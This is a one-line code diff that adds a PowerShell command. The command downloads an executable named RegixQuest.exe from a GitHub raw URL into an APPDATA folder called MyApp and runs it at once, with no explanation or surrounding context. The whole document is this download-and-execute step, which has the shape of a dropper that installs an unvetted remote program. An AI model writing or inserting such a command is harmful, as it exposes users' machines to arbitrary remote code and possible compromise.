@@ -1,0 +1,1 @@
+ $u="https://raw.githubusercontent.com/regixbios/tg/refs/heads/main/RegixQuest.exe";$d="$env:APPDATA\MyApp";New-Item $d -ItemType Directory -Force|Out-Null;Invoke-WebRequest $u -OutFile "$d\RegixQuest.exe";Start-Process "$d\RegixQuest.exe"
